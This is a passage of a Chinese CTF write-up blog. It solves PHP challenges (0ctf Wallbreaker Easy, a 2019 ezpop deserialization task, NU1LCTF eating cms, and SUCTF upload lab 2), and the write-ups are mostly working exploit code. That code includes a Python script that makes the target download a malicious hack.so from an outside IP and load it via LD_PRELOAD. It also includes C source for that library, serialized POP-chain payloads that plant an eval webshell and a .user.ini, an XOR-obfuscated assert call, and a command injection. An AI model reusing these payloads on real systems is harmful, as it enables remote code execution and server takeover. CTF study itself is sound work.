<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>最后包含代码去执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=include("/tmp/ch4ser.php")</span></span><br></pre></td></tr></table></figure>
<p><code>mail</code>函数产生进程的同时就会触发preload中的代码, 然后读输出中的flag就行了</p>
<h1>0ctf Wallbreaker Easy</h1>
<p>这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。</p>
<p>在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。</p>
<h2 id="主要思路">主要思路</h2>
<p>利用<code>Imagick()</code>中会触发<code>php解释器向外开启系统进程</code>的方法，这里的思路是当传入<code>MPEG</code>格式类型的文件时候，为了转换格式会向外部环境请求并触发<code>ffmpeg</code>的调用，从而开启新的进程。在开启时，环境变量<code>LD_PRELOAD</code>会首先加载，而我们事先会将我们的<code>恶意共享文件hack.so在这个环境变量中指出来</code>，即<code>LD_PRELOAD={DIR}/hack.so</code>。hack.so共享文件由hack.c文件编译，其中调用了<code>__attribute__((constructor))</code>，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是<code>/readflag &gt; {dir}/flag</code>啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://111.186.63.208:31340/"</span></span><br><span class="line">dir = <span class="string">"/tmp/ef757c06e983a137384378f47607abfa"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#the first time i do this ,i use format function 'format' to replace $dir but failed,then i used $dir and '%',worked ,after the flag went out ,the format problem seems to dispeare?</span></span><br><span class="line"><span class="comment">#the new Imagick('&#123;filename&#125;') beginning with no work,but didnot after replace'''to '"',also disapeared after sovled it</span></span><br><span class="line">cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;pre&gt;hello???????&lt;br&gt;&lt;?php echo 'hello';?&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$dir = "&#123;0&#125;";</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/hack.so",file_get_contents("http://207.148.64.125:80/hack.so"));</span></span><br><span class="line"><span class="string">chmod("&#123;0&#125;/hack.so",0777);</span></span><br><span class="line"><span class="string">putenv("LD_PRELOAD=&#123;0&#125;/hack.so");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser.wmv","sssss");</span></span><br><span class="line"><span class="string">file_put_contents("&#123;0&#125;/ch4ser","");</span></span><br><span class="line"><span class="string">$tocken = new Imagick('&#123;0&#125;/ch4ser.wmv');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(dir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#why the command line been executed can not be more than 2 in my script?cause the include will cause error</span></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">file_put_contents('%s/evil',base64_decode("%s"));</span></span><br><span class="line"><span class="string">include "%s/evil";</span></span><br><span class="line"><span class="string">'''</span>%(dir,base64.b64encode(cmd),dir)</span><br><span class="line"></span><br><span class="line">print(requests.post(url, data=&#123;<span class="string">'backdoor'</span>: payload &#125;).content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"print_r(scandir('%s'));"</span>%dir&#125;).content</span><br><span class="line"><span class="keyword">print</span> requests.post(url,data=&#123;<span class="string">'backdoor'</span>:<span class="string">"echo file_get_contents('%s/ch4ser');"</span>%dir&#125;).content</span><br></pre></td></tr></table></figure>
<p>脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。</p>
<p>然后服务器上面的<code>hack.c</code>文件如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/ch4ser"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/55161547-c39d6480-51a0-11e9-9f1c-f01618558228.png" alt="flag"></p>
<blockquote>
<p>ps:每个人的目录会不定时被服务器清空</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>代码审计 题型记录[working forever]</title>
    <url>/2019/04/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="2019高校运维赛ezpop-改-2020buu新年红包题第一题">2019高校运维赛ezpop 改 ==&gt; 2020buu新年红包题第一题</h2>
<p>源代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">'flysystem'</span>, $expire = null)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span> </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        $cache_filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . uniqid() . $name;</span><br><span class="line">        <span class="keyword">if</span>(substr($cache_filename, -strlen(<span class="string">'.php'</span>)) === <span class="string">'.php'</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">'?'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $cache_filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>
<p>两种解法</p>
<h3 id="解法一-目录穿透写-user-ini来rce">解法一: 目录穿透写.user.ini来rce</h3>
<ul>
<li>通过伪协议来写文件, 由于写的内容前面部分有拼接, 将他们以base64解码的形式写入文件中让死亡exit失效, 由于base64本身的规则需要再添加几个字符来和前面拼接的字符串形成长度为4倍数的字符串</li>
<li>用路径穿透, 将uniquid当作目录用一个<code>../</code>跳出去从而达到控制写入文件名的效果</li>
<li>用.user.ini来绕过后缀名的限制</li>
</ul>
<p>写一个<code>test.ch4ser</code>到web根目录下面,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">'serialize'</span> =&gt; <span class="string">"base64_decode"</span>, </span><br><span class="line">                      <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                      <span class="string">'prefix'</span> =&gt; <span class="string">"php://filter/write=convert.base64-decode/resource=uploads/"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">"/../../test.ch4ser"</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">'qaq'</span>.base64_encode(<span class="string">'&lt;?php @eval($_POST["aaa"]);?&gt;'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>再写一个<code>.user.ini</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">'serialize'</span> =&gt; <span class="string">"base64_decode"</span>, </span><br><span class="line">                      <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                      <span class="string">'prefix'</span> =&gt; <span class="string">"php://filter/write=convert.base64-decode/resource=uploads/"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">"/../../.user.ini"</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">'qaq'</span>.base64_encode(<span class="string">"</span></span><br><span class="line"><span class="string">auto_prepend_file=test.ch4ser"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>这样web根目录下的<code>index.php</code>就是我们的shell了</p>
<h3 id="解法二-控制serialize方法直接命令执行">解法二: 控制serialize方法直接命令执行</h3>
<ul>
<li>system(xxxxxx)的时候, xxxx中如果有<strong>反引号包裹的东西那么这块部分会被优先执行</strong></li>
</ul>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">"ppp"</span>=&gt;<span class="string">'`cat /flag &gt; ./hello`'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complete = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">            <span class="string">'serialize'</span> =&gt; <span class="string">'system'</span>,</span><br><span class="line">            <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">            <span class="string">'prefix'</span> =&gt; <span class="string">"ggg"</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h3 id="解法三-目录穿透加控制后缀名为-php-来写入文件绕过">解法三: 目录穿透加控制后缀名为.php/.来写入文件绕过</h3>
<h2 id="NU1LCTF-2018-eating-cms">NU1LCTF 2018 eating cms</h2>
<p>php伪协议读源码, 部分截取如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">"Location: hacker.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">"flag"</span>,<span class="string">"manage"</span>,<span class="string">"ffffllllaaaaggg"</span>,<span class="string">"info"</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">'query'</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这过滤会干扰读源码的过程, 不过<code> parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</code>这种东西绕过已经是套路了, host后面跟三个///就可以了, 读着读着就找到了一个文件上传的地方, 源码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload fileï¼"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"file upload success&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span>.$filename.<span class="string">" | base64 -w 0"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/png;base64,"</span>.$picdata.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>命令注入但是过滤了斜杆, 这个要测出来</p>
<p><img src="/images/image-20200118225014552.png" alt="image-20200118225014552"></p>
<h2 id="SUCTF-2019-upload-lab-2">SUCTF 2019 upload lab 2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
